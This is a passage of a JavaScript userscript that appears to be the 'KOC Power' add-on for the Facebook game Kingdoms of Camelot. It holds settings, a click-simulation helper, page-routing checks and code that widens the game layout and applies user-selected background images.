6%2FHFOt88ewHl0eqekRPPPFGpvcqnYMqzh3vC2PvbS%2BZjuNN9SFe9e2djknHLfKIWd9H8mp7u0usY8KPjjZTGfrYdrlrb34xo2%2F%2FbjVckt%2BLOVBWz70yfH5XZ7D1onN%2BVZli3d2eaGLN7p2jFvnuHY7X92zyK1vLXWNXst%2Bune173Y77td6bi%2FoeYse9etTnwj536ujqzziXDcfu3uzhwr4w5tXn%2Fv1FB%2BOtva%2Fc3%2Bwh8RbZ7zqWLOe7PK6dz6%2BWUd9%2FtFjn%2B3c9z7rKc47vBOP77wDPOsIbzf62w3%2FIue%2F8QGwfMw7k%2FPSBz3tSA831Huf7hw4v97VT4L3%2B1b%2BRohB8NEOgdapW3nuRr9lXa5omZuWjxZoq%2FjFbIUQbKF2JribCuLmgrjJYPg2%2BDPy7dB8IERfegxIQhuaUIFCTKF2HuidCCbxhXrDmQyfSMP1iW%2BKHaziB1eFRTWlETclrM0JqwdG64hRO2S0jhJxw8TaOLE2UKxhG%2B2mNQ8K8IoE3I0WrXPH1%2BQRd3vcTR%2Bt88fdBLI2g3xNIV9zSDZKUZFUZCEPYfdI3ERyN5NcTSU5d0ncZHI3m8RNJ1%2FzydWEcjWj%2FjxgInO4SDg2Uo6rrE0r7chFPHpxgbOsTS1xc8va5HI1u0RNL1Hzyy0GUzw6RKUVjYk5ngFRiHOqVPYSF05O1VGUawRmKYV5yiOmsmtzFE8ya%2FNK1MRycM98TTRrM83XVBM11xRNNkWzTUkuszY49OYwwRnHZoUwi%2B18zT5F08%2Bx%2FXM1AX3NQFdTUNEc1DMJ9cxCXdnQ1zzUO9%2Bk5zp1VlE6gs1AzUQhEQ2XznzFtF8X1eY7uRlPiM5zjEhcYukwOFN8%2FhQ1GfXMRpXWUdR8dDUhRc1IPVNSzZxUMylVZjddGlGYTlSm93RVU0XzVM1E1WVTFU1VUXNV0WRVM1ul%2F0xXKfNVfa50NS3VzkuNWs8BjvN45TQn%2FBoYRiMKlqdl9en3UqdB5E3ujRItJkXP2re0ematlGlrxN7qmbiKZq6eqStl7jqZvE5mrxjtK2r%2Bap3A%2BvGogkzqE5eK1ppqLoiIxYpoNUNaz5hWM6idjGofw9rHuHY1nqWMbHdDW03a1pO4NaRuN8vbw%2F4WuDndHWNrq87Hui2yx3xtWAE71saSd3%2FZLSBnNfPcx4B2XsGlzHA1U1zKHPcxyXXMch3TXKfCVjTRxc10bVldXV5XlO%2BFZHwpM1%2FH1Nda951Mfimz38n01zH%2FXUyAFzNgtRbYMweuTYKluWBrNtiXD2ZlhP4nM%2BHFVLhaF35Mhiez4cd0eDEfVkyIFTPizpZYMyd%2BTYoFumKDtlibL0ZmjB8zY8VQLwWXuPKVh5QCSFw5FD8AUiCOlKQhKpaP4aXueDEbLvP%2B0D1HXk2SQbpkkjZZoU9%2BTT7Ra1PfbsUG4vjzOv4xlin0Ix3iWIcSAFChCGWIzOhUF5XMyLY6IzTKIg4qQ9M72%2FWKt6fFu%2FNq8uzcIk%2FmhAQggANYkSE%2ByCMExAGABpyTnH4UATgE%2BK4KdxrpMt82hmwmp5t9ZkrLklXNCQM1akRN4LDdFCtT0MeXARAK57Ai0TZAi1rSACQNcJvbJWjGPNwh7nGTu9zmPje6zf7tDV6ku93ufrc7iOENeNO73u5gAjXiYe99o1sdvFAHvwNe7mVEQ%2BAGd0c9wCAKfR884LwoR8MDzg1iRJzf9ShNPSq%2Bb2JwQ%2BP2Lge7yw1wj587HqIAQ8ZJDu9rXMPjI3%2B3v1%2B%2Bb5nbex7NJoA1GoTzdEBiGPoowrXlQBahT4EVRj%2B6OVrxiVGM4hNOf%2FonVHGKpbei6U5XRSumDnWot0IVXof6Kbw%2BC1pInelWP8UpRuF1prci62k3%2Byfargq1Nx3rbm97062uClrM4utPP4Xcrb71q6tdFVdvO%2BLRXnWnmz3sWtjE1AUP9a%2BPAu1PH0XXB%2F90rPud8VI%2FBS3ezv50xqfd61NPvNnr3vXCO73tis%2F60q9OC7Ib%2FvKAX7zmo856qiP%2B7mlfutlb0QZGKF3ym5%2F7JyzP%2BMznnvOdVzvaQz%2F30S%2B99Gu3u%2BibDvi5h731d8%2B83sfe%2Berjnfpb97rfMd97xf8%2B9a0YxCCKr%2Fm1Jx%2F5S8e68Tff9eejfe99F331Md31uV7qJR%2FedV%2FUud3tUV%2Fl0R7UVR4BNh%2F6ed76bV%2FeBd8gaIH8DR7dUZ3VqR3uceD%2B1V71hR0lUELZUd%2FbDaDbwZ36CeDhfR%2FcJZ%2F0bd3t%2FZ7mFR7ygWDvQeAHsl2zqUWiYUUIaAAAlAA9XELQDR1waAArdNeP2AAkQP5hghxCtFHhVoSCEWIhkTwhF2qFGoTBF2qFFY5hVmihGQrEIaRhcohhGpahGYZAg5ihDYxFGm7BkKQhK%2FAZFrLCFv7IIcDDFhJAChjhgoRCCuBDIACAEvRDHm5FqrGhFLIhJFzhGKKhGUZiGoYhG8KhGWLiGP7AGqZhGLihGXriF8ohG4oiG4aBGrDhHurhH9raMOBCVoSAPLBCCEwBP8gBzlnDlnlFE3ohHU5hGlYiG4LiF2qiGXLiG1riF4ZCCKQhK5KiKY4hKnKhKlLjKJphKaYhAcSiGfohnDSHMWJFV8gDPsSiEtADPuiDHbaFE0riOY4hMqahMnIhM46hM%2F%2BeIjRyoTRyYyte4xdmIxZuoxlWozcSJBaGIx9SITn%2BCAHYwJhhxQtsQRG8GgCkwBb8Y1bMYxpO4jF6JBXmIxbu4xf2IzaSJBQGZEJ24xh%2B4zOmIUKGIkx%2BoUyOoUPKIhZqACxI4iVQIkt2V0SOoQbY4ia%2B4kjC4jSaYRHUY0oqpRne4xiGADGGIlRyoRpI5RcSAC48JBTCwix2lw2woQOUZRq%2BwFhyoQ1o5BiiZRw2JR2uJRa2ZRo6wAuwYQjI5Ri%2BAFh210Tq5RSs4lD%2BFly%2BpVv%2BlgbYAF8C5l7u5atpwA80JucwZlZM5GFiZmIOTgj0wKsRwF5qgKsR4Q98wPv%2FnKUNBNFEroBWTGRevk8K%2FEAJKMhjjiYAhMAP0KW1pEAPzGIJ5KZW%2FKZuRsxZviYRhqaPFKcQEcBkZkUKpKZW8OZfusxz3uJjJidFnmZtOid0cud0SooDbCeQPOYfvkB34o5mfmQPzKZ6ViTn4KZcimZoZoV5bmbEgGZt%2Bshi8qVkUma1NEBthsBv4GcRRmZzCtEPpIM%2ByANDmpMS3AM%2BvGOiFcE6LOgjco4S9CJWOEAovGMo%2FAaHeuh31ooD4MI6%2BMgWRGiEftkUyIM%2BIBruvIA1RKg15KUT6gM%2BXMJv3GiONgDnEEAgRCg9CB1XqOg95OUWuOg6RIfLAGmEikOt%2FyUHPeiDOERbGExpleLOD4hDhB4CcWgAl%2BIDPyxiCPgcPnjp%2B8iBP7ihHNwDlaKlHLyjONTA%2B4TAOgzHRq5DhGpoClgDjsbj4ByCiqbDb%2FDBOwIjVhiqPiCq0kCCiorDbzjqk%2F5GkOrDMLiny4QALkQoOfqZPtCDUnoqqFaPGqijPAymtEWopZ6ao%2BoDLpjm4BTBPkSoOo7FD1SoPOThrVqo0mQoreLDHDCiO0poWuDqhf7oMFQpK7QaFRoqH6iBHKTAL%2F6AiQ4niY4BPWhocpTFFvDDK4ZBWYArVyrNC%2BACP0AqVhyCPMgBtApoOgzDDyTriEbKpirBFOADcsgBP%2F9sgRo4IgDoK7%2F6a6z%2BAyTYQCjoQ15GiBywgRxwWy5u6TDYp6T8QD%2FwgZ8Nw206B8RmrJeJQ8RyDi6kQw8EQj8k2g%2FoAyRAa60JqhLwAT9EaWVmqxi%2BQI7e6hPS7CXY7PtcQj%2FgqRLowyGoQR182SXQQxEcAj8cZpMOgzVAqxpMJD8cQhEkIQBcm9RSbZNawzBA6xicmtZyLXOOaRHgQ1ZGzCXggxKk6JCY6A%2Bc7VewrdtyTg%2FsQ8EOQ8Q6gDjgArSKYYbOwbMt4uCkgByw66ZmZLL%2BwLJqAAEc7rL6p6QILuHiw5fVAT48a7ROa7XCpiICAKENYXeFAjA2ZViMxRb%2F0BrnbIGF4AORhsKJEoA4PCHrOgABpMNVugze2i26AgAuXGpT%2FgA%2FaBsbJO3gEEAY5KHW6q44AIk8BCUuiAOqLS%2FnvAAfTGPp1towsEIJbGEjDmYgIKzLSCZxMC3n9sNgCmoIbK%2BiCePgvEBeToE%2FJFoY4EMRJAnOYWwiAu7gNECy4oMYKketXYI8OEDpRgcAw%2BrgJKk44Gmc%2FkCSLMgThgWRjk2sHUIKQABW6GtZssI6EAAGA4AGz2uC4GIgpICPiDAJJ%2Bo%2B5KUr5K7SxFpQimZ43sMUFoEjaoAMp4XAjk2QknARbqTqnnD6TiPTSuy8aMA6jEUK6MMidm4JKPH4%2F3pupq7D6oauRe4D6Zpu9fguG6SFt0Kh6%2BKDOkICAdAw3%2FZDg1qLDdjAC%2BiD0C0unlqDNTjAELsxEdMKASiBA0TIb2CAnqqjlxLaYG6BP6Aq7qgFH9QvADRA3jrA8eItUqInLghirIFx5c5arfUrzEZMCgyDPNRa8H4ZBqcBP4DyKFcPHyQhcUACP6jjpRoHcsTaHI4NH4jDvYqhy8YAAHRvCvDBPpRlIKQw56SAPKgB6BJHKKwyPrxqCNxwIpattfiuPNwDgwKAo36Fo4aAoFozPrDnvAABMsPDkHizOoIzNd%2FDNBat49YKze7uEQNADVhx1fbiC8DztQGqy0wb6%2F%2FiQvsiM4yGgiB68DpYa7VAAqECgDe%2FolqEwbUhdBePzSWgK85RshgnNCPmMOfQ8Cv6bgQjVpAEgg2QLEaacUWf8bzMcxvDcfjG8RADANOCcKTELqxdgsUeQskCMgAIMiEPzg%2FIgzVogCLbousOQwTkbSJrbR3XCgFcQlncZijIgRSOMrjWWhpgscsYbDvr65cFbw%2BoQSmzwXKYst3mpRzk7L1eAizD2nFwzg8YbQrsw5AEAj%2FkJS9Lr%2FfCtdLOSzjCrjUkasFuwT4cQgmQ7UbSgzNXi8FugQ1sagg46mwKaglAwj1oM6bSCuIiNid3ZihYdqsB8DRe8%2BDYAD6swxT%2FAOzoxjMfnMVY2AA8D84xQ4ISJPAYh8IU%2FIA1BLQGG%2BG0CTStJCKRqkVG%2Fy7FMvQWK80K4INSdnQdOiIZczFJz4tG43BzL5AGEDbFlvGxkus%2BEOkcGzUuDEf9HnWtwHR0KiL6li4UK81Oi8NXIDLeukIDNDJR%2FyjPbjRWBF31AsAnc44c9IMNgGt06OsLKAcRAEAdCG%2F1nLVWNG8KMEjGBuXYeCU8yIGgssIPdHD3loCF44NxukyGXoIc1PbTagXTCvMUJuJNHvD77nA5a0A2UzM9pHOtmLdWhIE%2FHC0%2BnLM86LacrHFQzu4lrPEiXhsbJPEi9oC2OrT3Bu%2BG77cN%2F1yIEbrCieIOG6iv78IBFyM2P2zxcisN5XLzR1L371b0dStNYE%2Bh%2F0JhCARCrZl4YC8iVxemOmc3VgCwBjhAWtO5nccya0d5CpThtdXBWQgdH3jv%2Bt7pmGkwAdjwFCK6Bgg25yCtVL7AIeQlEJhxdaevl1dLEVzCbIbBPxQBDQ8JJNCDBoS6i8M4eAYtkKwDLnCwUra0%2BKL28JooPMiDO8JB50rbibpvorGujsfJFsDDOtQ6PlhDCdSBGAa1IwtEP4xrxBytEY7BcoDrlzUvAfRrtbOwtShBIBghthdBt%2BM3f3N1Wa60BLP6qps19HZucwSlTQ%2BOy4LyPqQAtxcqP%2F%2BswKB%2FhTU88uC4wsf68Boqx2SeqSWPze7eopoDfJtzBT%2F0wAKFAj3UQQK7dMQYxzqoASvgg8O7wrpOfPXEQD8QaYer8mCOPD%2Fk9J7%2FRgrcgzikAS7QwwssrhSzOnjLSTj2gziEgiusYbdy2cveND%2F4fCZzOD%2BsIyvggg2swKKOgTXAg4D%2BmRzImsv4Li7IwTqIQ50ncB3cwwtrPdf%2FKC7Ao1KL4THzAdIKnb4GQsZvuO3WuVr4op0Og6FOYQhgyNz%2FaLc1r%2BLiQnarshjCNR%2FggjxM9rb%2FAyuowZ02QArQAy647CIufuOPqdJMwT%2BEAuJHLOVbvoQQwDoDPu7A9SH%2BkDwAnC0f1LYRkr7pRy89WIPVt7qnX0KpPqEN6EMoQDru2LmDA0AAsMKQejzvy4HHf688nKMRX3zGfxnHA38cL1AIPDTS1yUr5O0QpkAovC7bj00K4MIjMr01sMEAYEUawDEb1DytBMKHYsUPrDAuROkLVD8ico4T4oL8D8MUcjAcu6H9W0N004oa4IIrAAQuXMN%2BACiCSxyrHgAA2GAl7lIIhhMpVrQ4ccowcaFeMLThCqLEhiAjXjR5kmEISOKsqSEAQMMhlnJeNggkbtgUlDtNpsClhOEPhJA0MAQytChPpRMDXUq5suUAAA5kDgO6lOcWjZdSMFSi8ZADr2CtxWK9GGZrVwBoIZYYKy5QWbMmHQSyZm0MQw0rcRWEydfvXJMHIXYloMaaOEgitYrj81LwRQ2swlAMcUmcKxspMWuOTJEDri0UHYr7ybBEqIQdP%2B%2FUALn13NcVZ8dW6iDpRNy2lQbgAFsvb6Ua5OotLvwigdwMlSNvTvH5xOjIYR4nTvs4dejLAUzXjh289t3bK3pvPV43d%2FTUr1OsPfG9c%2FXzv5uMDxP49%2Fu1AwIAOw%3D%3D";
var provMapCoords = {imgWidth:710, imgHeight:708, mapWidth:670, mapHeight:670, leftMargin:31, topMargin:19};  
var MAP_DELAY = 1000;
// SOUND ALARM
var SWF_PLAYER_URL = 'http://koc.god-like.info/alarmplayer.swf';
// IMG
var URL_CASTLE_BUT = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAXCAMAAAGkBsQ5AAABa1BMVEX%2F%2F8X%2F98X%2F973%2F97X%2F77X%2F7633773%2F76X377X3763%2F5q3%2F5qX%2F5pz35q335qX%2F3pz%2F3pT33pz%2F1pT%2F1oz%2F1oT31pT31oz%2FzoT%2Fznv3zoT%2FxXv%2FxXP%2FxWv3xXv3xXP%2FvWv%2FvWP3vWv3vWP%2FtWP%2FtVr%2FtVLmvWv3tWP3tVr3tVL%2FrVL%2FrUrmtWP3rVL3rUrvrVL%2FpUrvrUr%2FpULmrVrmrVL3pUr3pULmpUL3nDrepULWpVLWpUrmnDrFpUK1pVrOnDqcnFKcnEqMnEp7lHN7lGtzlGNrlGtjjEpajFpShFJSe2NChEJKe1o6hDohjDFCc1oZjDEhhDEQjDEAlDEpezoZhDEhezoQhDEAjDEpczoZezoIhDEhc0IhczoAhDEZczoIezEhazoAezEhY0IAczEAcykIazEhWkIAazEAaykIYzEhUkIAYzEAWjEAUjEAUikASjEASikAQjEAQikAOjEAOikAMTEAMSkAKSlOGAcLAAAACXBIWXMAAAsSAAALEgHS3X78AAABVklEQVQYGQXBPW4TYRiF0ee%2B3x2DRSxRIFJTGIkVUFDQIbEDlkE5%2B8kWWEKKIBSB5AohXBGUSAaCIdgz3x%2FnaARztjS3RSPodPkmfuzReLbOh1fm72a4h3kxyWgE8NXPz8%2F%2FhC%2FzRXLM3cmeqvGDl7Mfa9ztT9pvp3%2FDOpjOr7Yft9PXjPHxE%2Bl6p4SJqSq5RsL4EAtZaUAjAABoBADAt%2Fty8ovVnhQ%2Bfx%2BbDTfXQ9Bz5H7IdWGV9k588NJWrQiXjMkdly6Fo9beRap29F4QJBxTE%2Bo9bF7XuUpJsp8BAGjcATSgADOQWRsfLu8WT0%2B33wcePknfJj%2B6j3Hb17m5HQsr1%2Fm4aGBEbtp8uXPWzcSBlhYYXKunObLoOyU1jFH02oVRZNFJQ2CCko26MIrC3MAEpRdcSVkYFYzBuaAuQFFAgzFBK0GVZhYoaUYYVm8b0IAGNDr8B8ZXpEbZNGQ6AAAAAElFTkSuQmCC";
var URL_CASTLE_BUT_SEL = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAXAgMAAAHuttyYAAAACVBMVEX%2F%2F%2F8AOjEAKSnbo5E5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAW0lEQVQI12NYwdAAhCsYOICwQQGEpiYwrGpgCHRgcIChUAeGqaERDBMZJRgmMCDwqlUrgHgBQ2hoAIMjiwAYOzBgxyA1ILVTQ4GggWEKK4MIK4JiYGAgiYKYAgBFlyWR9CCfyAAAAABJRU5ErkJggg%3D%3D";
// RITTER ROLLEN
var knightRoles = [	[culang.foreman, 'politics', culang.shrpolitics],	[culang.marschall, 'combat', culang.combat],	[culang.alchemystic, 'intelligence', culang.shrint],	[culang.steward, 'resourcefulness', culang.shrres],];

/**********************************************************************************/
/************ KOC POWER - CODE ***************************************************/
/************ do not touch the code below if you dont know what you are doing ***/
/*******************************************************************************/
/** The following code is released under public domain ************************/
/*****************************************************************************/
// READ OPTIONS
readOptions();
readColors();
readGlobalOptions ();
readChatOptions();
readStyleOptions();

var nHtml={
     FindByXPath:function(obj,xpath,nodetype) {
     if(!nodetype){
       nodetype = XPathResult.FIRST_ORDERED_NODE_TYPE;
     }

     try {
       var q=document.evaluate(xpath,obj,null,nodetype,null);
     } catch(e) {
      GM_log('bad xpath:'+xpath);
    }
    if(nodetype == XPathResult.FIRST_ORDERED_NODE_TYPE){
       if(q && q.singleNodeValue) { return q.singleNodeValue; }

     }else{
      if(q){
        return q;
      }
     }
     return null;
    },
     ClickWin:function(win,obj,evtName) {
     var evt = win.document.createEvent("MouseEvents");
    evt.initMouseEvent(evtName, true, true, win,
      0, 0, 0, 0, 0, false, false, false, false, 0, null);
    return !obj.dispatchEvent(evt);
     },
    Click:function(obj) {
     return this.ClickWin(window,obj,'click');
     },
     ClickTimeout:function(obj,millisec) {
    window.setTimeout(function() {
      return nHtml.ClickWin(window,obj,'click');
    },millisec+Math.floor(Math.random()*500));
    },
  SetSelect:function(obj,v) {
    for(var o=0; o<obj.options.length; o++) {
      if(v==obj.options[o].value) { obj.options[o].selected=true; return true; }
    }
    return false;
     },
   }
   
if (document.URL.search(/kingdomsofcamelot.com\/fb\/e2\/src\/helpFriend_src.php/i) >= 0){
 helpFriends ();
  return;
}


if (document.URL.search(/apps.facebook.com\/kingdomsofcamelot/i) >= 0){
  facebookInstance ();
  return;
}
if (document.URL.search(/kabam.com\/kingdoms-of-camelot\/play/i) >= 0 || document.URL.search(/kingdomsofcamelot\.com\/fb\/.*?\/standAlone\.php/i) >= 0){
  kabamStandAlone ();
  return;
}
if (document.URL.search(/facebook.com\/connect\/uiserver.php/i) >= 0){
  HandlePublishPopup ();
  return;
}
if (document.URL.search(/kingdomsofcamelot.com/i) >= 0){
  kocWideScreen ();
}   
function kocWideScreen(){
  function setWideFb (){
	var kocFrame = parent.document.getElementById('kofc_iframe_0');
	if (!kocFrame){
	  setTimeout (setWideFb, 1000);
	  return;
	}
	kocFrame.style.width = '100%';
	//kocFrame.style.height = '100%';
	var style = document.createElement('style')
	style.innerHTML = 'body {margin:0; width:100%; !important;}';
	kocFrame.parentNode.appendChild(style);
  }
  if(document.URL.match(/standalone=0/i)){
	  kocWatchdog ();
	  if (GlobalOptions.pbWideScreen)
			setWideFb();
  }
}
/***  Run only in "apps.facebook.com" instance ... ***/
function facebookInstance (){
    function setWide (){
    var iFrame = document.getElementById('iframe_canvas');
     if (!iFrame){
      setTimeout (setWide, 1000);
      return;
     }
    iFrame.style.width = '100%';
    while ( (iFrame=iFrame.parentNode) != null)
      if (iFrame.tagName=='DIV')
       iFrame.style.width = '100%';
	   document.getElementById('globalContainer').style.left = '0px';
       try{
	   
        document.getElementById('rightCol').parentNode.removeChild(document.getElementById('rightCol'));
         document.getElementById('leftColContainer').parentNode.removeChild(document.getElementById('leftColContainer'));
       } catch (e){
         // toolkit may have removed them already!
      }
       var e = document.getElementById('mainContainer');
    if(e){
	document.getElementById('pagelet_canvas_footer_content').style.display= 'none';

		if (GlobalOptions.pbWideScreenStyle=="normal") e.parentNode.style.minWidth = '100%';
		if (GlobalOptions.pbWideScreenStyle=="wide") e.parentNode.style.width = '1520px';
		if (GlobalOptions.pbWideScreenStyle=="ultra") e.parentNode.style.width = '1900px';
		if (GlobalOptions.pbWideScreenStyle=="mega") e.parentNode.style.width = '2400px';
		if (GlobalOptions.pbWideScreenStyle=="own") e.parentNode.style.width = ""+Colors.WideScreenWidth+"" + 'px';
			for(i=0; i<e.childNodes.length; i++){
		if(e.childNodes[i].id == 'contentCol'){
			e.childNodes[i].style.margin = '0px';
			e.childNodes[i].style.color = ''+Colors.MainFont+'';
			e.childNodes[i].style.paddingTop = '5px';
		if (Options.pdxBackgroundStyle=="pdxKoCOld")e.childNodes[i].style.backgroundColor = 'none';	
		if (Options.pdxBackgroundStyle=="pdxBackgroundColordark")e.childNodes[i].style.backgroundColor = ''+Colors.MainBodyDark+'';		  
		if (Options.pdxBackgroundStyle=="pdxBackgroundColor")e.childNodes[i].style.backgroundColor = ''+Colors.MainBody+'';
		if (Options.pdxBackgroundStyle=="pdxOwnBackground") e.childNodes[i].style.backgroundImage = "url('"+Options.ownWP+"')";
		if (Options.pdxBackgroundStyle=="pdxOwnBackgrounddark") e.childNodes[i].style.backgroundImage = "url('"+Options.ownWPdark+"')";
		if (Options.pdxBackgroundStyle=="pdxBackground1") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/facebook-blue.png')";		if (Options.pdxBackgroundStyle=="pdxBackground2") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/facebook-owns-world.jpeg')";		if (Options.pdxBackgroundStyle=="pdxBackground3") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/ubuntu.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground5") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/back7.png')";		if (Options.pdxBackgroundStyle=="pdxBackground6") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/webtreats-blue.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground7") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/dkgreyblogbackground.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground8") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/facebook.1.u.png')";		if (Options.pdxBackgroundStyle=="pdxBackground9") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/Facebook_Logo 30.png')";		if (Options.pdxBackgroundStyle=="pdxBackground10") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/texture-4.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground11") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground12") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/techno.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground13") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/metal-plate.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground14") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/metal-plate-blue.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground15") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/metal-plate-silver.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground16") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/metal.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground17") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/holed-aluminium.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground18") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/silver-light..jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground19") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/oldpaper3.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground20") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/oldpaper.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground21") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/paper-background1.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground22") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/paper-background2.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground23") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/crumpled-paper2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground24") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/crumpled-paper3.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground25") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/crumpled-paper.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground26") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture1.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground27") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground28") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture3.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground29") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture4.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground30") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture5.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground31") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture6.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground32") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture7.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground33") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture8.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground34") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/wood.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground35") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/wood-dark.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground36") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/wood2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground37") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/leaf.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground38") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/cloud2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground40") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/attention.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground41") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/darkred.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground42") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/darkgray.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground43") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/tech-theme.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground44") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/heart.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground45") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/butterfly-blue.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground46") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/blue.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground47") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/smoke.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground48") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-color.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground49") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-dark.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground50") e.childNodes[i].style.backgroundImage = 